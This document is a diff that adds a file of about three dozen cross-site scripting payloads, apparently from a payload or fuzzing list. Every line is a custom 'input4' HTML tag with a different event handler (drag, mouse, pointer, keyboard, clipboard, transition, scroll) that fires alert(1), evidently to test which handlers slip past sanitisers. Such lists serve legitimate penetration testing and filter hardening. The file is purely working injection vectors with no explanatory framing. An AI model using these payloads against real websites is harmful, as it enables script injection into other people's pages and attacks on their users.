@@ -1,0 +1,36 @@
+<input4 contenteditable onbeforeinput=alert(1)>test
+<input4 draggable="true" ondrag="alert(1)" style=display:block>test</input4>
+<input4 draggable="true" ondragend="alert(1)" style=display:block>test</input4>
+<input4 draggable="true" ondragenter="alert(1)" style=display:block>test</input4>
+<input4 draggable="true" ondragleave="alert(1)" style=display:block>test</input4>
+<input4 draggable="true" ondragstart="alert(1)" style=display:block>test</input4>
+<input4 id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></input4>
+<input4 onafterscriptexecute=alert(1)><script>1</script>
+<input4 onbeforescriptexecute=alert(1)><script>1</script>
+<input4 onblur=alert(1) id=x tabindex=1 style=display:block>test</input4><input value=clickme>
+<input4 onclick="alert(1)" style=display:block>test</input4>
+<input4 oncontextmenu="alert(1)" style=display:block>test</input4>
+<input4 oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<input4 oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<input4 ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</input4>
+<input4 onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</input4><input value=clickme>
+<input4 onkeydown="alert(1)" contenteditable style=display:block>test</input4>
+<input4 onkeypress="alert(1)" contenteditable style=display:block>test</input4>
+<input4 onkeyup="alert(1)" contenteditable style=display:block>test</input4>
+<input4 onmousedown="alert(1)" style=display:block>test</input4>
+<input4 onmouseenter="alert(1)" style=display:block>test</input4>
+<input4 onmouseleave="alert(1)" style=display:block>test</input4>
+<input4 onmousemove="alert(1)" style=display:block>test</input4>
+<input4 onmouseout="alert(1)" style=display:block>test</input4>
+<input4 onmouseover="alert(1)" style=display:block>test</input4>
+<input4 onmouseup="alert(1)" style=display:block>test</input4>
+<input4 onmousewheel=alert(1) style=display:block>requires scrolling
+<input4 onpointerdown=alert(1) style=display:block>XSS</input4>
+<input4 onpointerenter=alert(1) style=display:block>XSS</input4>
+<input4 onpointerleave=alert(1) style=display:block>XSS</input4>
+<input4 onpointermove=alert(1) style=display:block>XSS</input4>
+<input4 onpointerout=alert(1) style=display:block>XSS</input4>
+<input4 onpointerover=alert(1) style=display:block>XSS</input4>
+<input4 onpointerrawupdate=alert(1) style=display:block>XSS</input4>
+<input4 onpointerup=alert(1) style=display:block>XSS</input4>
+<input4 onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></input4>
